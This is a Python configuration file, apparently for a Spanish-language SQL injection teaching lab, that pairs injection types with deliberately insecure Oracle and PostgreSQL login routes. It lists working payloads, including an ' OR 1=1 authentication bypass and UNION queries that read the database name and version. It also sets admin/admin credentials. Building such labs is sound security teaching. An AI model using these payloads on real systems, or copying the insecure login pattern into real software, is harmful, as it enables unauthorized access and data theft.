from setupOracle import *
from setupPostgreSQL import *

# Diccionario de inyecciones SQL
sql_injections = {
    "database_error": {
        "title": "Inyección SQL Basada en Errores de la BD",
        "description": """
            <p>Utiliza los mensajes de error devueltos por la base de datos para extraer información confidencial.
            Este tipo de inyección se aprovecha de mensajes de error explícitos en las consultas SQL.</p>
        """,
        "credenciales":[
            {
                "nombre":"Unauthorized login",
                "usuario:":"cualquier_input",
                "password:":"cualquier_input' OR 1=1; --"
            },
            {
                "nombre":"DB tables info",
                "usuario:":"' OR 1=(SELECT * FROM tabla_inexistente) --",
                "password:":"cualquier_input"
            },
            {
                "nombre":"DB table column info",
                "usuario:":"' OR 1=(SELECT columna_inexistente FROM usuarios) --",
                "password:":"cualquier_input"
            }
        ],
        "route_oracle": "login_oracle_database_error",
        "route_postgres": "login_postgres_database_error",
        "function_oracle": login_inseguro_errors_oracle,  # Debes implementar esto en `setupOracle`
        "function_postgres": login_inseguro_errors_postgresql  # Debes implementar esto en `setupPostgreSQL`
    },
    "server_error": {
        "title": "Inyección SQL Basada en Errores del Servidor",
        "description": """
            <p>Utiliza los mensajes de error devueltos por el servidor para obtener información sobre la base de datos
            y realizar inyecciones de manera eficaz.</p>
        """,
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_server_error",
        "route_postgres": "login_postgres_server_error",
        "function_oracle": login_inseguro_errors_oracle,
        "function_postgres": login_inseguro_errors_postgresql
    },
    "union": {
        "title": "Inyección SQL Basada en Unión",
        "description": """
            <p>Combina dos o más consultas usando la palabra clave UNION para obtener resultados adicionales de la base de datos,
            lo cual permite acceder a datos adicionales en el mismo conjunto de resultados.</p>
        """,
        "credenciales":[
            {
                "nombre":"Unauthorized login",
                "usuario:":"cualquier_input",
                "password:":"cualquier_input' OR 1=1; --"
            },
            {
                "nombre":"DB name (Oracle)",
                "usuario:":"cualquier_input",
                "password:":"cualquier_input' OR 1=1 UNION SELECT ora_database_name AS nombre_bd FROM dual; --"
                #SELECT banner, NULL FROM v$version WHERE ROWNUM = 1
            },
            {
                "nombre":"DB version (Oracle)",
                "usuario:":"admin",
                "password:":"test' OR 1=1 UNION SELECT * FROM v$version WHERE banner LIKE 'Oracle%'; --"
                #SELECT banner, NULL FROM v$version WHERE ROWNUM = 1
            },
            {
                "nombre":"DB name (PostgreSQL)",
                "usuario:":"admin",
                "password:":"test' OR 1=1; --"
            },
            {
                "nombre":"DB version (PostgreSQL)",
                "usuario:":"admin",
                "password:":"test' OR 1=1; --"
            }
        ],
        "route_oracle": "login_oracle_union",
        "route_postgres": "login_postgres_union",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "boolean": {
        "title": "Inyección SQL Basada en Booleanos",
        "description": """
            <p>Emplea consultas booleanas para determinar si ciertas condiciones son verdaderas o falsas, sin necesidad de mensajes de error.
            Es útil para inferir datos en situaciones donde los errores están limitados.</p>
        """,
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_boolean",
        "route_postgres": "login_postgres_boolean",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "blind_boolean": {
        "title": "Inyección Basada en Verdadero/Falso (Blind Boolean-Based SQL Injection)",
        "description": """
            <p>Evalúa los resultados en función de respuestas booleanas sin revelar datos directamente. Es útil cuando los mensajes de error
            están deshabilitados, ya que permite al atacante inferir información a través de condiciones booleanas.</p>
        """,
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_blind_boolean",
        "route_postgres": "login_postgres_blind_boolean",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "time_based": {
        "title": "Inyección Basada en Tiempo (Time-Based Blind SQL Injection)",
        "description": """
            <p>Evalúa el tiempo de respuesta del servidor para inferir si la inyección es exitosa o no. Es útil en aplicaciones
            que no revelan errores ni permiten consultas booleanas.</p>
        """,
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_time_based",
        "route_postgres": "login_postgres_time_based",
        "function_oracle": login_inseguro_time_oracle,
        "function_postgres": login_inseguro_time_postgresql
    }
}